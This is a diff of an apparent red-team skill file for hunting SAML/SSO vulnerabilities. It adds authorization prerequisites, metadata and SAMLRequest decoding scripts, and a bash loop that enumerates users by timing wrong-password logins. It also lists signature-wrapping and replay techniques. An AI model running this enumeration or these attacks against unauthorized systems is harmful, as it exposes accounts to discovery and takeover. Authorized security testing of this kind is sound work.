@@ -4,9 +4,37 @@ description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) �
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [saml, hunt, redteam, sso]
+platforms: [linux]
+metadata:
+  tags: [saml, hunt, redteam, sso]
+  category: redteam
 ---
+
+## When to Use
+
+- Hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: standard Linux HTTP tooling (`curl`, `jq`).
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+TARGET="example.test"
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+# Fetch SP metadata first; 200 with <EntityDescriptor> confirms a SAML SP
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/saml/metadata" \
+  | tee "$OUTPUT_DIR/saml-metadata.xml"
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## 20. SAML / SSO ATTACKS
 > SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.
@@ -217,36 +245,147 @@ validate `<Issuer>` or `<AudienceRestriction>`, the attacker-IdP-signed assertio
 
 ---
 
-## Verification
-
-Run this self-test to confirm saml hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-saml" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **SAML without signature validation** — unsigned assertions or `WantAssertionsSigned="false"` are the primary SAML findings.
 - **XML signature wrapping (XSW)** — classic SAML attack. Test all 8 XSW variants, not just #1.
 - **SAML Response replay** — capturing and replaying a SAML Response within its validity window. Test NotOnOrAfter enforcement.
 - **SAML-to-JWT confusion** — SAML assertions are XML; JWT is JSON. Don't cross-apply attack techniques.
 - **SP metadata publicly accessible** — accessing `/saml/metadata` is informational. The finding is what the metadata reveals (unsigned requests, weak algorithms).
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
+
+---
+
+## Recon: Metadata, Request Decoding, and Timing (merged from saml-sso-attack)
+
+The retired `auth/saml-sso-attack` skill is consolidated here. Its recon phases complement the attack list above: parse IdP metadata before choosing a technique, decode captured SAMLRequests with the correct binding (HTTP-Redirect uses raw DEFLATE, POST uses plain base64), and treat timing-based user enumeration as a hint requiring multiple samples, not proof.
+
+### Phase 2 — Extract IdP Metadata
+
+```bash
+METADATA_URL="$1"  # e.g., https://idp.target.com/saml2/idp/metadata.php
+
+echo "[*] Extracting SAML metadata from $METADATA_URL"
+
+METADATA=$(curl -sk --max-time 10 --connect-timeout 10 "$METADATA_URL" 2>/dev/null)
+
+if [[ -z "$METADATA" ]]; then
+  echo "[-] No metadata accessible"
+  exit 1
+fi
+
+# Parse with Python
+echo "$METADATA" | python3 -c "
+import sys
+from xml.etree import ElementTree as ET
+
+content = sys.stdin.read()
+root = ET.fromstring(content)
+
+# Namespaces
+ns = {'md': 'urn:oasis:names:tc:SAML:2.0:metadata',
+      'ds': 'http://www.w3.org/2000/09/xmldsig#'}
+
+# Entity ID
+entity_id = root.get('entityID', 'unknown')
+print(f'Entity ID: {entity_id}')
+
+# Signing certificates
+for cert_el in root.iter('{http://www.w3.org/2000/09/xmldsig#}X509Certificate'):
+    cert = cert_el.text.strip()
+    print(f'Signing Cert ({len(cert)} chars): {cert[:60]}...')
+
+# SSO endpoints
+for el in root.iter():
+    if 'Binding' in el.attrib:
+        binding = el.attrib['Binding']
+        location = el.attrib.get('Location', '')
+        if 'HTTP-Redirect' in binding or 'HTTP-POST' in binding:
+            print(f'Endpoint: {location} [{binding.split(\":\")[-1]}]')
+
+# NameID formats
+for el in root.iter('{urn:oasis:names:tc:SAML:2.0:metadata}NameIDFormat'):
+    print(f'NameID Format: {el.text}')
+" 2>/dev/null
+```
+
+### Phase 3 — Decode & Analyze SAMLRequest
+
+```bash
+SAML_B64="$1"  # from URL parameter or Burp
+
+echo "[*] Decoding SAMLRequest"
+
+echo "$SAML_B64" | python3 -c "
+import sys, base64, zlib
+from xml.etree import ElementTree as ET
+
+raw = sys.stdin.read().strip()
+decoded = base64.b64decode(raw)
+try:
+    decompressed = zlib.decompress(decoded, -15)
+except:
+    decompressed = decoded
+
+xml = decompressed.decode('utf-8', errors='replace')
+print(xml[:3000])
+
+root = ET.fromstring(xml)
+print()
+print('=== Analysis ===')
+
+# Request ID
+req_id = root.get('ID', 'none')
+print(f'Request ID: {req_id}')
+
+# Issuer
+issuer_el = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Issuer')
+if issuer_el is not None:
+    print(f'Issuer: {issuer_el.text}')
+
+# ForceAuthn
+force = root.get('ForceAuthn', 'false')
+print(f'ForceAuthn: {force}')
+
+# NameIDPolicy
+policy_el = root.find('.//{urn:oasis:names:tc:SAML:2.0:protocol}NameIDPolicy')
+if policy_el is not None:
+    allow_create = policy_el.get('AllowCreate', 'false')
+    fmt = policy_el.get('Format', 'unspecified')
+    print(f'NameIDPolicy: AllowCreate={allow_create}, Format={fmt}')
+" 2>/dev/null
+```
+
+### Phase 4 — SSO Timing-Based User Enumeration
+
+```bash
+SSO_HOST="$1"  # SSO host, no scheme
+USERS_FILE="$2"  # List of usernames/emails to test
+
+echo "[*] SSO timing-based user enumeration"
+
+# The technique: valid users produce a different response time than invalid users
+# because the server checks LDAP/AD before returning the SAML response
+
+while read -r user; do
+  START=$(date +%s%N)
+  curl -sk -o /dev/null --max-time 15 --connect-timeout 10 \
+    "https://$SSO_HOST/sso/login?username=$user&password=WRONG_PASS" 2>/dev/null
+  END=$(date +%s%N)
+  ELAPSED=$(( (END - START) / 1000000 ))
+
+  echo "  $user: ${ELAPSED}ms"
+  sleep 1
+done < "$USERS_FILE" | sort -t: -k2 -rn | head -20
+
+echo "[*] Users with significantly higher response times likely exist"
+```
 
 ---
 
